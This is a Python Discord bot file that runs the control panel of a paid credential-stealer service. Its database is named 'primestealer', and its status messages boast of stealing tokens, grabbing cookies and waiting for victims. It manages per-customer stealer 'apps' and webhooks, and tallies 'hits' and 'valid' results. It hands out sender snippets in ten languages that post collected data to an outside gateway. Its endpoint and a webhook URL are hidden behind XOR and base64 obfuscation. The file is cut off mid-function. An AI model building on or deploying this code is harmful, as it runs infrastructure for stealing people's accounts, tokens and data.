# language: Python 3.11+, file: bot_main.py
# deps: pip install discord.py motor python-dotenv
# env: BOT_TOKEN, MONGO_URI, MAIN_OWNER_ID

import os, json, base64, hashlib, hmac, zlib, secrets, threading
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
import discord
from discord import app_commands
from discord.ext import tasks
import motor.motor_asyncio
from dotenv import load_dotenv

load_dotenv()

# ── CONFIG ────────────────────────────────────────────────────
BOT_TOKEN     = os.environ["BOT_TOKEN"]
MONGO_URI     = os.environ["MONGO_URI"]
MAIN_OWNER_ID = int(os.environ["MAIN_OWNER_ID"])

_A = bytes([80,114,105,109,101])
_B = bytes([84,97,108,104,97])
_C = bytes([159,60,122,17,222,188,68,2,248,145,86,35,170,120,205,239])

def _get_sk() -> bytes:
    base = _A + _B + _C
    h = hashlib.sha256(_A + _C).digest()[:4]
    return bytes(a ^ b for a, b in zip(base[:4], h)) + base[4:]

def _dec(blob: str) -> str:
    sk  = _get_sk()
    raw = base64.b64decode(blob.encode())
    key = sk * (len(raw) // len(sk) + 1)
    return zlib.decompress(bytes(a ^ b for a, b in zip(raw, key))).decode()

_EP_ENC = 'jWVnJUx9Sdq6ttBzVljz8+jW07mc7+dVhCM893gmyf6zp6S2sHZX2fGWRQLBE1lU'
_WH_ENC = 'jWWpzLReo0x8YU8TICaTC64v8DMHp2caI8o/EmFfyxkgnINa+LarlvP8K4A+KAlL3og56SdPNh3aVWlDYYQDbLxGSin4oPQ7BUTMLwkTAwoXEGoVB8mmiist/7vh0S4ZU2K4WbsQITcY+tbFQ0cIEwk5WQ09Oy5CQ4UDueA='
API_ENDPOINT = _dec(_EP_ENC)
WEBHOOK_URL  = _dec(_WH_ENC)

# ── PLANS ─────────────────────────────────────────────────────
PLANS = {
    "free":      2,
    "basic":     15,
    "pro":       30,
    "elite":     75,
    "unlimited": -1,   # -1 = infinite
    "custom":    None, # custom_limit field
}
PLAN_LABELS = ["Free", "Basic", "Pro", "Elite", "Unlimited", "Custom"]

# ── MONGO ─────────────────────────────────────────────────────
mongo  = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
db     = mongo["primestealer"]
apps   = db["apps"]
panels = db["panels"]
users  = db["users"]
owners = db["owners"]

# ── HELPERS ───────────────────────────────────────────────────
def mono(s: str) -> str:
    out = []
    for c in s:
        if   'A' <= c <= 'Z': out.append(chr(0x1D670 + ord(c) - 65))
        elif 'a' <= c <= 'z': out.append(chr(0x1D68A + ord(c) - 97))
        elif '0' <= c <= '9': out.append(chr(0x1D7F6 + ord(c) - 48))
        else: out.append(c)
    return ''.join(out)

SEP = "○ . ⌣⌣⌣ . ཻུ꧂ . ⌣⌣⌣ . ○"

def ts_now() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S UTC")

def mask_webhook(url: str) -> str:
    return url[:45] + "••••" if len(url) > 45 else url

def new_secret() -> str:
    return secrets.token_hex(32)

def new_app_id() -> str:
    import uuid; return str(uuid.uuid4())

def app_limit(user: dict) -> int:
    plan = user.get("plan", "free")
    if plan == "custom":
        return user.get("custom_limit", 2)
    return PLANS.get(plan, 2)

def app_limit_str(user: dict) -> str:
    lim = app_limit(user)
    return "∞" if lim == -1 else str(lim)

def plan_label(user: dict) -> str:
    plan = user.get("plan", "free")
    if plan == "custom":
        lim = user.get("custom_limit", 0)
        return f"Custom ({lim})"
    return plan.capitalize()

# ── USER DB ───────────────────────────────────────────────────
async def get_user(uid: int, username: str = "") -> dict:
    u = await users.find_one({"uid": uid})
    if not u:
        u = {"uid": uid, "username": username, "plan": "free",
             "banned": False, "joined": datetime.now(timezone.utc).isoformat()}
        await users.insert_one(u)
    elif username and u.get("username") != username:
        await users.update_one({"uid": uid}, {"$set": {"username": username}})
        u["username"] = username
    return u

async def is_owner(uid: int) -> bool:
    if uid == MAIN_OWNER_ID: return True
    return bool(await owners.find_one({"uid": uid}))

async def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER_ID

# ── STANDARD EPHEMERAL MSGS ───────────────────────────────────
def msg_denied(reason: str) -> str:
    return (
        f"**. 花 . ᕫᴣ、{mono('Access Denied')} . ≧。 . ıl**\n\n"
        f"{SEP}\n\n"
        f"⊘ . {reason}\n\n"
        f"-# ⌇ only you can see this"
    )

def msg_not_allowed(reason: str) -> str:
    return (
        f"**. 花 . ᕫᴣ、{mono('Not Allowed')} . ≧。 . ıl**\n\n"
        f"{SEP}\n\n"
        f"⊘ . {reason}\n\n"
        f"-# ⌇ only you can see this"
    )

# ── BAN CHECK ─────────────────────────────────────────────────
async def check_banned(itr: discord.Interaction) -> bool:
    u = await get_user(itr.user.id, itr.user.name)
    if u.get("banned") and not await is_main_owner(itr.user.id):
        await itr.response.send_message(msg_denied(f"{mono('Status')} ⌇ banned"), ephemeral=True)
        return True
    return False

# ── PANEL TEXT ────────────────────────────────────────────────
def panel_text(app: dict) -> str:
    name    = app.get("name", "—")
    app_id  = app.get("app_id", "—")
    hits    = app.get("hits", 0)
    valid   = app.get("valid", 0)
    alerts  = app.get("alerts", 0)
    status  = "active" if app.get("active", True) else "inactive"
    webhook = mask_webhook(app.get("webhook", "—"))
    return (
        f"**. 花 . ᕫᴣ、{mono(name)} . ≧。 . ıl**\n\n"
        f"{SEP}\n\n"
        f"⌇  . {mono('App ID')}   ⌇  {app_id}\n"
        f"✦  . {mono('Hits')}     ⌇  {hits}\n"
        f"⊕  . {mono('Valid')}    ⌇  {valid}\n"
        f"⊘  . {mono('Alerts')}   ⌇  {alerts}\n"
        f"ᯓ★ . {mono('Status')}   ⌇  {status}\n"
        f"⌇  . {mono('Webhook')}  ⌇  {webhook}\n\n"
        f"-# ⌇ {mono('last updated')} . {ts_now()}"
    )

# ── PANEL VIEW ────────────────────────────────────────────────
class PanelView(discord.ui.View):
    def __init__(self, app_id: str, user_id: int):
        super().__init__(timeout=None)
        uid = str(user_id)
        self.add_item(PBtn("◈  Credentials", f"cred:{app_id}:{uid}", discord.ButtonStyle.secondary))
        self.add_item(PBtn("⊹  Integration",  f"intg:{app_id}:{uid}", discord.ButtonStyle.secondary))
        self.add_item(PBtn("↻  Rotate",        f"rot:{app_id}:{uid}",  discord.ButtonStyle.secondary))
        self.add_item(PBtn("✎  Rename",         f"ren:{app_id}:{uid}",  discord.ButtonStyle.secondary))
        self.add_item(PBtn("✕  Delete",          f"del:{app_id}:{uid}",  discord.ButtonStyle.danger))
        self.add_item(PBtn("⌇  Webhook",         f"wh:{app_id}:{uid}",   discord.ButtonStyle.secondary))

class PBtn(discord.ui.Button):
    def __init__(self, label, custom_id, style):
        super().__init__(label=label, custom_id=custom_id, style=style)

# ── INTEGRATION ───────────────────────────────────────────────
LANGUAGES = ["Python","C#","C++","Go","Rust","Java","NodeJS","PHP","Ruby","VB.NET"]

LANG_CODE = {
    "Python":("python","""import hmac, hashlib, json, requests

APP_ID = "YOUR_APP_ID"
SECRET = "YOUR_SECRET"

def send(payload: dict):
    body = json.dumps(payload).encode()
    sig  = hmac.new(SECRET.encode(), body, hashlib.sha256).hexdigest()
    requests.post(
        "https://gateway.primetalha.qzz.io/report",
        data=body,
        headers={
            "Content-Type": "application/json",
            "X-App-ID":     APP_ID,
            "X-Sig":        sig,
        }, timeout=15)"""),
    "C#":("csharp","""using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

const string APP_ID   = "YOUR_APP_ID";
const string SECRET   = "YOUR_SECRET";
const string ENDPOINT = "https://gateway.primetalha.qzz.io/report";

static string Sign(byte[] body) {
    using var h = new HMACSHA256(Encoding.UTF8.GetBytes(SECRET));
    return Convert.ToHexString(h.ComputeHash(body)).ToLower();
}
static async Task Send(object payload) {
    var body    = JsonSerializer.SerializeToUtf8Bytes(payload);
    var content = new ByteArrayContent(body);
    content.Headers.Add("Content-Type","application/json");
    content.Headers.Add("X-App-ID", APP_ID);
    content.Headers.Add("X-Sig",    Sign(body));
    using var http = new HttpClient();
    await http.PostAsync(ENDPOINT, content);
}"""),
    "C++":("cpp","""// deps: libcurl, openssl
#include <curl/curl.h>
#include <openssl/hmac.h>
#include <string>

const std::string APP_ID   = "YOUR_APP_ID";
const std::string SECRET   = "YOUR_SECRET";
const std::string ENDPOINT = "https://gateway.primetalha.qzz.io/report";

std::string sign(const std::string& body) {
    unsigned char out[32]; unsigned int len=32;
    HMAC(EVP_sha256(),SECRET.data(),SECRET.size(),
         (unsigned char*)body.data(),body.size(),out,&len);
    char hex[65];
    for(int i=0;i<32;i++) sprintf(hex+i*2,"%02x",out[i]);
    return std::string(hex,64);
}
void send_report(const std::string& json_body) {
    CURL* c=curl_easy_init();
    struct curl_slist* h=nullptr;
    h=curl_slist_append(h,"Content-Type: application/json");
    h=curl_slist_append(h,("X-App-ID: "+APP_ID).c_str());
    h=curl_slist_append(h,("X-Sig: "+sign(json_body)).c_str());
    curl_easy_setopt(c,CURLOPT_URL,ENDPOINT.c_str());
    curl_easy_setopt(c,CURLOPT_HTTPHEADER,h);
    curl_easy_setopt(c,CURLOPT_POSTFIELDS,json_body.c_str());
    curl_easy_perform(c); curl_easy_cleanup(c);
}"""),
    "Go":("go","""package main
import (
    "bytes";"crypto/hmac";"crypto/sha256"
    "encoding/hex";"net/http"
)
const appID    = "YOUR_APP_ID"
const secret   = "YOUR_SECRET"
const endpoint = "https://gateway.primetalha.qzz.io/report"

func sign(body []byte) string {
    mac := hmac.New(sha256.New, []byte(secret))
    mac.Write(body)
    return hex.EncodeToString(mac.Sum(nil))
}
func send(body []byte) {
    req,_:=http.NewRequest("POST",endpoint,bytes.NewReader(body))
    req.Header.Set("Content-Type","application/json")
    req.Header.Set("X-App-ID",appID)
    req.Header.Set("X-Sig",sign(body))
    http.DefaultClient.Do(req)
}"""),
    "Rust":("rust","""// Cargo.toml: reqwest={features=["blocking"]}, hmac, sha2, hex
use hmac::{Hmac,Mac}; use sha2::Sha256;
const APP_ID:   &str = "YOUR_APP_ID";
const SECRET:   &str = "YOUR_SECRET";
const ENDPOINT: &str = "https://gateway.primetalha.qzz.io/report";

fn sign(body: &[u8]) -> String {
    let mut m=Hmac::<Sha256>::new_from_slice(SECRET.as_bytes()).unwrap();
    m.update(body); hex::encode(m.finalize().into_bytes())
}
fn send(body: &str) {
    let sig=sign(body.as_bytes());
    reqwest::blocking::Client::new().post(ENDPOINT)
        .header("Content-Type","application/json")
        .header("X-App-ID",APP_ID).header("X-Sig",sig)
        .body(body.to_string()).send().ok();
}"""),
    "Java":("java","""import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.net.http.*; import java.net.URI;

public class Sender {
    static final String APP_ID   = "YOUR_APP_ID";
    static final String SECRET   = "YOUR_SECRET";
    static final String ENDPOINT = "https://gateway.primetalha.qzz.io/report";

    static String sign(byte[] body) throws Exception {
        Mac mac=Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(SECRET.getBytes(),"HmacSHA256"));
        byte[] h=mac.doFinal(body); StringBuilder sb=new StringBuilder();
        for(byte b:h) sb.append(String.format("%02x",b));
        return sb.toString();
    }
    static void send(String json) throws Exception {
        byte[] body=json.getBytes();
        HttpClient.newHttpClient().send(
            HttpRequest.newBuilder(URI.create(ENDPOINT))
                .header("Content-Type","application/json")
                .header("X-App-ID",APP_ID).header("X-Sig",sign(body))
                .POST(HttpRequest.BodyPublishers.ofByteArray(body)).build(),
            HttpResponse.BodyHandlers.discarding());
    }
}"""),
    "NodeJS":("javascript","""const crypto=require('crypto'), https=require('https');
const APP_ID='YOUR_APP_ID', SECRET='YOUR_SECRET';
const ENDPOINT='https://gateway.primetalha.qzz.io/report';

function sign(body){
    return crypto.createHmac('sha256',SECRET).update(body).digest('hex');
}
function send(payload){
    const body=JSON.stringify(payload), sig=sign(body);
    const url=new URL(ENDPOINT);
    const req=https.request({hostname:url.hostname,path:url.pathname,
        method:'POST',headers:{'Content-Type':'application/json',
        'X-App-ID':APP_ID,'X-Sig':sig}});
    req.write(body); req.end();
}"""),
    "PHP":("php","""<?php
const APP_ID='YOUR_APP_ID', SECRET='YOUR_SECRET';
const ENDPOINT='https://gateway.primetalha.qzz.io/report';

function send(array $payload): void {
    $body=json_encode($payload);
    $sig=hash_hmac('sha256',$body,SECRET);
    $ctx=stream_context_create(['http'=>[
        'method'=>'POST',
        'header'=>implode("\\r\\n",['Content-Type: application/json',
            'X-App-ID: '.APP_ID,'X-Sig: '.$sig]),
        'content'=>$body]]);
    file_get_contents(ENDPOINT,false,$ctx);
}"""),
    "Ruby":("ruby","""require 'net/http','openssl','json','uri'
APP_ID='YOUR_APP_ID'; SECRET='YOUR_SECRET'
ENDPOINT=URI('https://gateway.primetalha.qzz.io/report')

def sign(body) = OpenSSL::HMAC.hexdigest('SHA256',SECRET,body)

def send_report(payload)
    body=payload.to_json
    req=Net::HTTP::Post.new(ENDPOINT)
    req['Content-Type']='application/json'
    req['X-App-ID']=APP_ID; req['X-Sig']=sign(body); req.body=body
    Net::HTTP.start(ENDPOINT.host,ENDPOINT.port,use_ssl:true){|h|h.request(req)}
end"""),
    "VB.NET":("vbnet","""Imports System.Net.Http, System.Security.Cryptography
Imports System.Text, System.Text.Json

Module Sender
    Const APP_ID   As String = "YOUR_APP_ID"
    Const SECRET   As String = "YOUR_SECRET"
    Const ENDPOINT As String = "https://gateway.primetalha.qzz.io/report"

    Function Sign(body As Byte()) As String
        Using h=New HMACSHA256(Encoding.UTF8.GetBytes(SECRET))
            Return Convert.ToHexString(h.ComputeHash(body)).ToLower()
        End Using
    End Function
    Async Function Send(payload As Object) As Task
        Dim body=JsonSerializer.SerializeToUtf8Bytes(payload)
        Dim content=New ByteArrayContent(body)
        content.Headers.Add("Content-Type","application/json")
        content.Headers.Add("X-App-ID",APP_ID)
        content.Headers.Add("X-Sig",Sign(body))
        Using http=New HttpClient()
            Await http.PostAsync(ENDPOINT,content)
        End Using
    End Function
End Module"""),
}

def integration_text(lang: str, app: dict) -> str:
    tag, code = LANG_CODE.get(lang, ("text","# not found"))
    code = code.replace("YOUR_APP_ID", app["app_id"]).replace("YOUR_SECRET", app["secret"])
    return (
        f"**. 花 . ᕫᴣ、{mono('Integration')} — {mono(lang)} . ≧。 . ıl**\n\n"
        f"{SEP}\n\n"
        f"```{tag}\n{code}\n```\n\n"
        f"-# ⌇ {mono('endpoint')} . {API_ENDPOINT}\n"
        f"-# ⌇ only you can see this"
    )

class LangSelect(discord.ui.Select):
    def __init__(self, app_id: str, user_id: int):
        self._aid = app_id; self._uid = user_id
        super().__init__(placeholder="Select language…",
            options=[discord.SelectOption(label=l,value=l) for l in LANGUAGES],
            custom_id=f"langsel:{app_id}:{user_id}")
    async def callback(self, itr: discord.Interaction):
        if itr.user.id != self._uid:
            await itr.response.send_message(msg_denied(f"{mono('Permission')} ⌇ not your panel"), ephemeral=True); return
        app = await apps.find_one({"app_id": self._aid})
        if not app:
            await itr.response.send_message(msg_denied(f"{mono('App')} ⌇ not found"), ephemeral=True); return
        await itr.response.send_message(integration_text(self.values[0], app), ephemeral=True)

class LangView(discord.ui.View):
    def __init__(self, app_id, user_id):
        super().__init__(timeout=120)
        self.add_item(LangSelect(app_id, user_id))

# ── MODALS ────────────────────────────────────────────────────
class RenameModal(discord.ui.Modal, title="Rename App"):
    new_name = discord.ui.TextInput(label="New Name", min_length=1, max_length=32)
    def __init__(self, app_id, msg_id, channel_id):
        super().__init__(); self._aid=app_id; self._mid=msg_id; self._cid=channel_id
    async def on_submit(self, itr: discord.Interaction):
        name = self.new_name.value.strip()
        await apps.update_one({"app_id":self._aid},{"$set":{"name":name}})
        app = await apps.find_one({"app_id":self._aid})
        await _update_panel(itr.client, self._aid, self._mid, self._cid, app, itr.user.id)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Renamed')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"ᯓ★ . {mono('App')} ⌇ {name}\n\n-# ⌇ only you can see this",
            ephemeral=True)

class WebhookModal(discord.ui.Modal, title="Set Webhook"):
    url = discord.ui.TextInput(label="Discord Webhook URL", min_length=10, max_length=200)
    def __init__(self, app_id, msg_id, channel_id):
        super().__init__(); self._aid=app_id; self._mid=msg_id; self._cid=channel_id
    async def on_submit(self, itr: discord.Interaction):
        wh = self.url.value.strip()
        await apps.update_one({"app_id":self._aid},{"$set":{"webhook":wh}})
        app = await apps.find_one({"app_id":self._aid})
        await _update_panel(itr.client, self._aid, self._mid, self._cid, app, itr.user.id)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Webhook Updated')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"⌇ . {mono('New Webhook')} ⌇ {mask_webhook(wh)}\n\n-# ⌇ only you can see this",
            ephemeral=True)

class AddOwnerModal(discord.ui.Modal, title="Add Owner"):
    user_id_input = discord.ui.TextInput(label="User ID", min_length=5, max_length=25)
    username_input = discord.ui.TextInput(label="Username", min_length=1, max_length=32)
    async def on_submit(self, itr: discord.Interaction):
        if not await is_main_owner(itr.user.id):
            await itr.response.send_message(msg_denied(f"{mono('Permission')} ⌇ main owner only"), ephemeral=True); return
        try: uid = int(self.user_id_input.value.strip())
        except:
            await itr.response.send_message(msg_not_allowed("invalid user id"), ephemeral=True); return
        if uid == MAIN_OWNER_ID:
            await itr.response.send_message(msg_not_allowed("cannot modify main owner"), ephemeral=True); return
        uname = self.username_input.value.strip()
        await owners.update_one({"uid":uid},{"$set":{"uid":uid,"username":uname,"added":datetime.now(timezone.utc).isoformat()}},upsert=True)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Owner Added')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"ᯓ★ . {mono('User')}  ⌇ {uname}\n"
            f"◈  . {mono('Role')}  ⌇ owner\n\n-# ⌇ only you can see this",
            ephemeral=True)

class CustomPlanModal(discord.ui.Modal, title="Set Custom Plan"):
    limit = discord.ui.TextInput(label="App Limit", min_length=1, max_length=5)
    def __init__(self, target_uid, target_name):
        super().__init__(); self._tuid=target_uid; self._tname=target_name
    async def on_submit(self, itr: discord.Interaction):
        try: lim = int(self.limit.value.strip())
        except:
            await itr.response.send_message(msg_not_allowed("invalid number"), ephemeral=True); return
        await users.update_one({"uid":self._tuid},{"$set":{"plan":"custom","custom_limit":lim}},upsert=True)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Plan Updated')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"ᯓ★ . {mono('User')}      ⌇ {self._tname}\n"
            f"◈  . {mono('Plan')}      ⌇ Custom\n"
            f"✦  . {mono('App Limit')} ⌇ {lim}\n\n-# ⌇ only you can see this",
            ephemeral=True)

# ── PANEL UPDATE ──────────────────────────────────────────────
async def _update_panel(bot, app_id, msg_id, channel_id, app, user_id):
    try:
        ch  = bot.get_channel(channel_id) or await bot.fetch_channel(channel_id)
        msg = await ch.fetch_message(msg_id)
        await msg.edit(content=panel_text(app), view=PanelView(app_id, user_id))
    except: pass


# ── STATUS ROTATION ───────────────────────────────────────────
STATUS_ROTATION = [
    '𝐒𝐭𝐞𝐚𝐥𝐢𝐧𝐠 𝐓𝐨𝐤𝐞𝐧𝐬 ⌇',
    '𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐒𝐜𝐚𝐧𝐬 ◈',
    '𝐂𝐨𝐥𝐥𝐞𝐜𝐭𝐢𝐧𝐠 𝐃𝐚𝐭𝐚 ✦',
    '𝐖𝐚𝐢𝐭𝐢𝐧𝐠 𝐅𝐨𝐫 𝐕𝐢𝐜𝐭𝐢𝐦𝐬 ⊹',
    '𝐁𝐲𝐩𝐚𝐬𝐬𝐢𝐧𝐠 𝐀𝐧𝐭𝐢𝐯𝐢𝐫𝐮𝐬 ᯓ★',
    '𝐋𝐢𝐬𝐭𝐞𝐧𝐢𝐧𝐠 𝐅𝐨𝐫 𝐊𝐞𝐲𝐬 ⛧',
    '𝐇𝐚𝐜𝐤𝐢𝐧𝐠 𝐒𝐭𝐮𝐟𝐟 ⚝',
    '𝐃𝐮𝐦𝐩𝐢𝐧𝐠 𝐌𝐞𝐦𝐨𝐫𝐲 ☾',
    '𝐄𝐱𝐟𝐢𝐥𝐭𝐫𝐚𝐭𝐢𝐧𝐠 𝐃𝐚𝐭𝐚 ⚜',
    '𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐧𝐠 𝐏𝐚𝐲𝐥𝐨𝐚𝐝𝐬 ☠',
    '𝐖𝐚𝐭𝐜𝐡𝐢𝐧𝐠 𝐓𝐡𝐞𝐦 𝐒𝐥𝐞𝐞𝐩 ⚘',
    '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐃𝐌𝐬 ❁',
    '𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭𝐭𝐢𝐧𝐠 𝐘𝐨𝐮 ✧',
    '𝐋𝐨𝐠𝐠𝐢𝐧𝐠 𝐊𝐞𝐲𝐬𝐭𝐫𝐨𝐤𝐞𝐬 ✵',
    '𝐆𝐫𝐚𝐛𝐛𝐢𝐧𝐠 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 ⚭',
]
_status_idx = 0

# ── BOT ───────────────────────────────────────────────────────
intents = discord.Intents.default()
bot     = discord.Client(intents=intents)
tree    = app_commands.CommandTree(bot)

@bot.event
async def on_ready():
    await tree.sync()
    refresh_panels.start()
    rotate_status.start()
    print(f"online — {bot.user}")

@tasks.loop(seconds=30)
async def refresh_panels():
    async for p in panels.find({}):
        try:
            app = await apps.find_one({"app_id": p["app_id"]})
            if not app: continue
            ch  = bot.get_channel(p["channel_id"]) or await bot.fetch_channel(p["channel_id"])
            msg = await ch.fetch_message(p["msg_id"])
            await msg.edit(content=panel_text(app), view=PanelView(p["app_id"], p["user_id"]))
        except: pass

@tasks.loop(seconds=300)
async def rotate_status():
    global _status_idx
    await bot.wait_until_ready()
    payload = {
        "op": 3,
        "d": {
            "since": None,
            "activities": [{
                "name": "Custom Status",
                "type": 4,
                "state": STATUS_ROTATION[_status_idx],
                "emoji": None
            }],
            "status": "online",
            "afk": False
        }
    }
    await bot.ws.send_as_json(payload)
    _status_idx = (_status_idx + 1) % len(STATUS_ROTATION)

# ── /app ──────────────────────────────────────────────────────
class CreateModal(discord.ui.Modal, title="Create App"):
    name    = discord.ui.TextInput(label="App Name",          min_length=1,  max_length=32)
    webhook = discord.ui.TextInput(label="Discord Webhook URL", min_length=10, max_length=200)
    async def on_submit(self, itr: discord.Interaction):
        u     = await get_user(itr.user.id, itr.user.name)
        count = await apps.count_documents({"owner": str(itr.user.id)})
        lim   = app_limit(u)
        if lim != -1 and count >= lim:
            await itr.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('Limit Reached')} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"⊘ . {mono('Apps')}  ⌇ {count}/{app_limit_str(u)}\n"
                f"◈ . {mono('Plan')}  ⌇ {plan_label(u)}\n\n-# ⌇ only you can see this",
                ephemeral=True); return
        aid    = new_app_id()
        secret = new_secret()
        await apps.insert_one({"app_id":aid,"owner":str(itr.user.id),
            "name":self.name.value.strip(),"webhook":self.webhook.value.strip(),
            "secret":secret,"active":True,"hits":0,"valid":0,"alerts":0})
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('App Created')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"ᯓ★ . {mono('Name')}   ⌇ {self.name.value.strip()}\n"
            f"⌇  . {mono('App ID')} ⌇ {aid}\n"
            f"◈  . {mono('Secret')} ⌇ ||{secret}||\n\n"
            f"-# ⌇ only you can see this",
            ephemeral=True)

@tree.command(name="app", description="Manage your apps")
@app_commands.describe(action="create or manage")
@app_commands.choices(action=[
    app_commands.Choice(name="create", value="create"),
    app_commands.Choice(name="manage", value="manage"),
])
async def app_cmd(itr: discord.Interaction, action: str):
    if await check_banned(itr): return
    await get_user(itr.user.id, itr.user.name)
    if action == "create":
        await itr.response.send_modal(CreateModal())
    else:
        uid       = str(itr.user.id)
        user_apps = await apps.find({"owner": uid}).to_list(length=75)
        if not user_apps:
            await itr.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('No Apps')} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"⊘ . no apps yet\n⊹ . use /app create\n\n-# ⌇ only you can see this",
                ephemeral=True); return
        u   = await get_user(itr.user.id)
        sel = discord.ui.Select(
            placeholder="Select an app…",
            options=[discord.SelectOption(label=a["name"], value=a["app_id"]) for a in user_apps])
        view = discord.ui.View(timeout=120)
        async def sel_cb(si: discord.Interaction):
            aid = sel.values[0]
            app = await apps.find_one({"app_id": aid, "owner": uid})
            if not app:
                await si.response.send_message(msg_denied(f"{mono('App')} ⌇ not found"), ephemeral=True); return
            pview = PanelView(aid, si.user.id)
            await si.response.send_message(panel_text(app), view=pview)
            msg = await si.original_response()
            await panels.update_one(
                {"app_id": aid, "user_id": si.user.id},
                {"$set": {"app_id":aid,"user_id":si.user.id,
                          "msg_id":msg.id,"channel_id":msg.channel.id}},
                upsert=True)
        sel.callback = sel_cb
        view.add_item(sel)
        count = await apps.count_documents({"owner": uid})
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Apps')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"◈ . {mono('Total')} ⌇ {count}/{app_limit_str(u)}",
            view=view, ephemeral=True)

# ── /plan ─────────────────────────────────────────────────────
@tree.command(name="plan", description="View your plan details")
async def plan_cmd(itr: discord.Interaction):
    if await check_banned(itr): return
    u     = await get_user(itr.user.id, itr.user.name)
    count = await apps.count_documents({"owner": str(itr.user.id)})
    lim   = app_limit_str(u)
    await itr.response.send_message(
        f"**. 花 . ᕫᴣ、{mono('Plan Details')} . ≧。 . ıl**\n\n{SEP}\n\n"
        f"ᯓ★ . {mono('Username')}  ⌇ {u.get('username','—')}\n"
        f"◈  . {mono('Plan')}      ⌇ {plan_label(u)}\n"
        f"✦  . {mono('Apps')}      ⌇ {count}/{lim}\n"
        f"⊹  . {mono('Status')}    ⌇ {'banned' if u.get('banned') else 'active'}\n\n"
        f"-# ⌇ only you can see this",
        ephemeral=True)

# ── /admin user ───────────────────────────────────────────────
@tree.command(name="admin", description="Admin panel")
@app_commands.describe(section="user or owner")
@app_commands.choices(section=[
    app_commands.Choice(name="user",  value="user"),
    app_commands.Choice(name="owner", value="owner"),
])
async def admin_cmd(itr: discord.Interaction, section: str):
    if await check_banned(itr): return
    if section == "user":
        if not await is_owner(itr.user.id):
            await itr.response.send_message(msg_denied(f"{mono('Permission')} ⌇ owner only"), ephemeral=True); return
        all_users = await users.find({}).to_list(length=25)
        if not all_users:
            await itr.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('No Users')} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"⊘ . no users yet\n\n-# ⌇ only you can see this",
                ephemeral=True); return
        sel = discord.ui.Select(
            placeholder="Select a user…",
            options=[discord.SelectOption(
                label=u.get("username","unknown") or "unknown",
                value=str(u["uid"])) for u in all_users])
        view = discord.ui.View(timeout=120)
        async def sel_cb(si: discord.Interaction):
            target_uid = int(sel.values[0])
            # owner cannot manage main owner
            if target_uid == MAIN_OWNER_ID:
                await si.response.send_message(msg_not_allowed("cannot modify main owner"), ephemeral=True); return
            # owner cannot manage self
            if target_uid == si.user.id and not await is_main_owner(si.user.id):
                await si.response.send_message(msg_not_allowed(f"{mono('owners cannot modify their own plan')}"), ephemeral=True); return
            tu = await get_user(target_uid)
            count = await apps.count_documents({"owner": str(target_uid)})
            lim   = app_limit_str(tu)
            uview = UserManageView(target_uid, tu.get("username","—"), si.user.id)
            await si.response.send_message(
                f"**. 花 . ᕫᴣ、{mono(tu.get('username','—'))} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"ᯓ★ . {mono('Username')} ⌇ {tu.get('username','—')}\n"
                f"◈  . {mono('Plan')}     ⌇ {plan_label(tu)}\n"
                f"✦  . {mono('Apps')}     ⌇ {count}/{lim}\n"
                f"⊹  . {mono('Status')}   ⌇ {'banned' if tu.get('banned') else 'active'}\n"
                f"⌇  . {mono('Joined')}   ⌇ {tu.get('joined','—')[:10]}\n\n"
                f"-# ⌇ only you can see this",
                view=uview, ephemeral=True)
        sel.callback = sel_cb
        view.add_item(sel)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('User Manage')} . ≧。 . ıl**\n\n{SEP}",
            view=view, ephemeral=True)

    else:  # owner section
        if not await is_main_owner(itr.user.id):
            await itr.response.send_message(msg_denied(f"{mono('Permission')} ⌇ main owner only"), ephemeral=True); return
        all_owners = await owners.find({}).to_list(length=25)
        add_view = discord.ui.View(timeout=120)
        add_btn  = discord.ui.Button(label="✦  Add Owner", style=discord.ButtonStyle.secondary)
        async def add_cb(bi: discord.Interaction):
            await bi.response.send_modal(AddOwnerModal())
        add_btn.callback = add_cb
        add_view.add_item(add_btn)

        if not all_owners:
            await itr.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('Owner Manage')} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"⊘ . no owners added yet",
                view=add_view, ephemeral=True); return

        sel = discord.ui.Select(
            placeholder="Select an owner…",
            options=[discord.SelectOption(
                label=o.get("username","unknown"),
                value=str(o["uid"])) for o in all_owners])
        async def osel_cb(si: discord.Interaction):
            target_uid = int(sel.values[0])
            owner_doc  = await owners.find_one({"uid": target_uid})
            if not owner_doc:
                await si.response.send_message(msg_denied(f"{mono('Owner')} ⌇ not found"), ephemeral=True); return
            oview = discord.ui.View(timeout=60)
            rem   = discord.ui.Button(label="✕  Remove Owner", style=discord.ButtonStyle.danger)
            async def rem_cb(ri: discord.Interaction):
                conf_view = discord.ui.View(timeout=60)
